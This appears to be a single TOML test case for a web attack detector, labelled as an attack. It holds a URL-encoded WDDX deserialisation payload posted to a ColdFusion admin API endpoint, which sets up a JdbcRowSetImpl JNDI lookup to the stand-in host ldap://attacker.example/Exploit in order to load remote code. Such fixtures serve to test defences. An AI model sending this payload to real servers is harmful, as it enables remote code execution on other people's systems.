[[case]]
name = "wddx-rowset-jndi"
kind = "attack"
via = "request"

[case.request]
method = "POST"
uri = "/CFIDE/adminapi/accessmanager.cfc"
query = "method=foo&_cfclient=true&argumentCollection=%3CwddxPacket%20version%3D%271.0%27%3E%3Cheader/%3E%3Cdata%3E%3Cstruct%20type%3D%27xcom.sun.rowset.JdbcRowSetImplx%27%3E%3Cvar%20name%3D%27dataSourceName%27%3E%3Cstring%3Eldap%3A//attacker.example/Exploit%3C/string%3E%3C/var%3E%3Cvar%20name%3D%27autoCommit%27%3E%3Cboolean%20value%3D%27true%27/%3E%3C/var%3E%3C/struct%3E%3C/data%3E%3C/wddxPacket%3E"
